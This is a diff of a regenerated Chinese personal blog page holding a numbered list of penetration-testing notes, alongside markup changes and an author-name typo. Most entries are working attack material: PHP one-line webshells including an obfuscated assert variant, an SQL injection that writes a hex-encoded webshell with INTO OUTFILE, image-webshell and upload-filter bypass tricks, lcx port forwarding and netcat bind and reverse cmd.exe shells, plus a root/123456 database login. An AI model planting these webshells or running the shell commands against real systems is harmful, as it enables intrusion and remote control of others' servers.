@@ -25,7 +25,7 @@
     <meta http-equiv="X-UA-Compatible">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#0097A7">
-    <meta name="author" content="George Lee">
+    <meta name="author" content="Geroge Lee">
     <meta name="description" content="Nothing is difficult to the man who will try.">
     <meta name="keywords" content="personal blog">
 
@@ -288,7 +288,7 @@
     </div>
     <!-- Author Name & Date -->
     <div>
-        <strong>George Lee</strong>
+        <strong>Geroge Lee</strong>
         <span>11月 15, 2016</span>
     </div>
 
@@ -367,12 +367,6 @@
 
     <!-- Share LinkedIn -->
     
-        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=http://lzx.dropsec.xyz//2016/11/15/常用知识一/index.html&title=常用知识一" target="_blank">
-            <li class="mdl-menu__item">
-                分享到 LinkedIn
-            </li>
-        </a>
-    
 
     <!-- Share QQ -->
     
@@ -395,78 +389,43 @@
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
         <p>1、Nmap扫描网段内存活的主机，nmap -sn xxx.xxx.xxx.0/24</p>
-<p>2、MySQL 连接远程数据库（192.168.5.116），端口“3306”，用户名为“root”，密码“123456”
-C:/&gt;mysql -h 192.168.5.116 -P 3306 -u root -p123456</p>
-<p>3、解决宽字节注入办法:
-mysql_query(&quot;SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary&quot;, $conn);</p>
-<p>&lt;!--more--&gt;</p>
+<p>2、MySQL 连接远程数据库（192.168.5.116），端口“3306”，用户名为“root”，密码“123456”<br>C:/&gt;mysql -h 192.168.5.116 -P 3306 -u root -p123456</p>
+<p>3、解决宽字节注入办法:<br>mysql_query(“SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary”, $conn);</p>
+<a id="more"></a>
 <p>4、图片一句话木马：copy 1.jpg/b+1.asp/a 2.jpg</p>
 <p>5、流量分析：foremost+strings</p>
-<p>6、常用端口：
-一 ：Oracle端口号，默认是1521
-二：SQL Server（mssql）端口号，默认是1433
-三：MySQL端口号，默认3306
-四：pointbase端口号，默认是9092
-五：DB2端口号，默认是5000
-六：Redis端口，（nosql）默认端口6379
-七：Mongodb端口，（nosql）默认端口27017</p>
+<p>6、常用端口：<br>一 ：Oracle端口号，默认是1521<br>二：SQL Server（mssql）端口号，默认是1433<br>三：MySQL端口号，默认3306<br>四：pointbase端口号，默认是9092<br>五：DB2端口号，默认是5000<br>六：Redis端口，（nosql）默认端口6379<br>七：Mongodb端口，（nosql）默认端口27017</p>
 <p>7、在php.ini 中把display_errors 选项设为display_errors = off  这样就可以防止报错注入</p>
-<p>8、在php.ini 中把disable_functions= 配置，这个禁止命令执行的几个函数，即可禁止命令执行
-如：disable_functions=system,passthru,shell_exec,exec,popen</p>
-<p>9、配置文件包含漏洞php.ini中
-1、allow_url_fopen=off  allow_url_include=off
-2、将包含的路径或者读取路径写死，仅允许读取指定的文件
-3、expose_php=off</p>
+<p>8、在php.ini 中把disable_functions= 配置，这个禁止命令执行的几个函数，即可禁止命令执行<br>如：disable_functions=system,passthru,shell_exec,exec,popen</p>
+<p>9、配置文件包含漏洞php.ini中<br>1、allow_url_fopen=off  allow_url_include=off<br>2、将包含的路径或者读取路径写死，仅允许读取指定的文件<br>3、expose_php=off</p>
 <p>10、PHP防止文件包含下的目录遍历：open_basedir = G:\wamp\www\FIleInclude\</p>
-<p>11、sql注入插入一句话：
-select 0x273C3F706870206576616C28245F504F53545B3132335D293B3F3E27 into outfile '/var/www/html/1.php'#
-0x273C3F706870206576616C28245F504F53545B3132335D293B3F3E27='&lt;?php eval($_POST[123]);?&gt;'</p>
+<p>11、sql注入插入一句话：<br>select 0x273C3F706870206576616C28245F504F53545B3132335D293B3F3E27 into outfile ‘/var/www/html/1.php’#<br>0x273C3F706870206576616C28245F504F53545B3132335D293B3F3E27=’&lt;?php eval($_POST[123]);?&gt;’</p>
 <p>12、上传文件：(gif9a)</p>
 <p>shell.php;.jpg 或shell.php.a;.jpg</p>
-<p>13、php黑魔法：php2、php3、php5、php7、phpa、phpb、phP
-&quot;%00&quot;、&quot;/0&quot;,&quot;?&quot;、&quot;///////////....//////&quot;、&quot;%80-%99&quot;都可以截断</p>
+<p>13、php黑魔法：php2、php3、php5、php7、phpa、phpb、phP<br>“%00”、”/0”,”?”、”///////////….//////“、”%80-%99”都可以截断</p>
 <p>14、or 在黑名单中时，可以使用 || 绕过</p>
-<p>15、*.swp *.swo 都是vim编辑文件时的临时文件（称为交换文件）</p>
-<p>16、php下的一句话
-&lt;?php eval($_POST[cmd]);?&gt;</p>
+<p>15、<em>.swp </em>.swo 都是vim编辑文件时的临时文件（称为交换文件）</p>
+<p>16、php下的一句话<br>&lt;?php eval($_POST[cmd]);?&gt;</p>
 <p>&lt;?php assert($_POST[cmd]);?&gt;</p>
-<p>&lt;?php ($_=@$<em>GET[2]).@$</em>($_POST[1])?&gt;</p>
-<p>在菜刀里写入http://site/1.php?2=assert密码是1</p>
-<p>&lt;script language=”php”&gt;
-@$<em>=&quot;s&quot;.&quot;s&quot;./<em>-/</em>-<em>/&quot;e&quot;./</em>-/<em>-</em>/&quot;r&quot;;
-@$</em>=/<em>-/</em>-<em>/&quot;a&quot;./</em>-/<em>-</em>/$<em>./<em>-/</em>-*/&quot;t&quot;;
-@$</em>/<em>-/</em>-<em>/($/</em>-/<em>-</em>/{&quot;_P&quot;./<em>-/</em>-<em>/&quot;OS&quot;./</em>-/<em>-</em>/&quot;T&quot;}
-[/<em>-/</em>-<em>/0/</em>-/<em>-</em>/-/<em>-/</em>-<em>/2/</em>-/<em>-</em>/-/<em>-/</em>-<em>/5/</em>-/<em>-</em>/]);&lt;/script&gt;</p>
+<p>&lt;?php ($_=@$<em>GET[2]).@$</em>($_POST[1])?&gt;    </p>
+<p>在菜刀里写入<a href="http://site/1.php?2=assert密码是1" target="_blank" rel="external">http://site/1.php?2=assert密码是1</a></p>
+<script language="”php”">
+@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
+@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
+@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
+[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);</script>  
+
 <p>密码是  -7</p>
-<p>17、写入一句话到指定目录：
-&lt;?php
-file_put_contents(&quot;E:/php.php&quot;,&quot;&lt;?php eval($_POST[cmd];?&gt;&quot;);
-?&gt;</p>
+<p>17、写入一句话到指定目录：<br>&lt;?php<br>file_put_contents(“E:/php.php”,”&lt;?php eval(\$_POST[cmd];?&gt;”);<br>?&gt;</p>
 <p>18、端口映射：</p>
-<p>1、LCX转发
-内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口
-例如：lcx.exe –slave 192.168.43.142 51 192.168.43.137 3389</p>
-<p>将内网(192.168.43.137)的3389端口转发到公网(192.168.43.142)的51端口
-然后在公网的机器上：
-Lcx.exe –listen 监听51端口，转发到公网机器的3389端口
-例如：Lcx.exe –listen 51 3389</p>
+<p>1、LCX转发<br>内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口<br>例如：lcx.exe –slave 192.168.43.142 51 192.168.43.137 3389</p>
+<p>将内网(192.168.43.137)的3389端口转发到公网(192.168.43.142)的51端口<br>然后在公网的机器上：<br>Lcx.exe –listen 监听51端口，转发到公网机器的3389端口<br>例如：Lcx.exe –listen 51 3389</p>
 <p>我们在本地机器上远程公网IP+3389 ，就连接上了内网机器的3389</p>
-<p>19、NC 反弹CMDshell
-本机：192.168.43.142(win7) 远程机器：192.168.43.137(xp)</p>
-<p>正向连接：
-在远程机器上(t参数可以省略):nc -l -p 8888 -t -e cmd.exe
-在本机:nc -nvv 192.168.43.137 8888
-成功之后，本地机器就获得了一个远程机器的shell</p>
-<p>反向连接：
-在本机运行上:nc -l -p 8888
-在远程主机上:nc -t -e cmd.exe 192.168.43.142 8888
-然后成功之后，我们在本地机器上看一下，已经获得了远程机器的cmdshell</p>
-<p>20、
-windows下
-tasklist 查看进程
-taskkill 结束进程</p>
-<p>21、XSS解决方法：
-htmlspecialchars进行过滤</p>
+<p>19、NC 反弹CMDshell<br>本机：192.168.43.142(win7) 远程机器：192.168.43.137(xp)</p>
+<p>正向连接：<br>在远程机器上(t参数可以省略):nc -l -p 8888 -t -e cmd.exe<br>在本机:nc -nvv 192.168.43.137 8888<br>成功之后，本地机器就获得了一个远程机器的shell</p>
+<p>反向连接：<br>在本机运行上:nc -l -p 8888<br>在远程主机上:nc -t -e cmd.exe 192.168.43.142 8888<br>然后成功之后，我们在本地机器上看一下，已经获得了远程机器的cmdshell</p>
+<p>20、<br>windows下<br>tasklist 查看进程<br>taskkill 结束进程</p>
+<p>21、XSS解决方法：<br>htmlspecialchars进行过滤</p>
 
     
 
@@ -542,7 +501,7 @@ htmlspecialchars进行过滤</p>
 
     <!-- Sidebar Avatar -->
     <div class="sidebar-image">
-        <img src="/img/avatar.png" alt="George Lee's avatar">
+        <img src="/img/avatar.png" alt="Geroge Lee's avatar">
     </div>
 
     <!-- Sidebar Email -->
@@ -609,7 +568,7 @@ htmlspecialchars进行过滤</p>
         <li class="dropdown">
             <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                 
-                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                    <i class="material-icons sidebar-material-icons">inbox</i>
                 
                 分类
                 <b class="caret"></b>
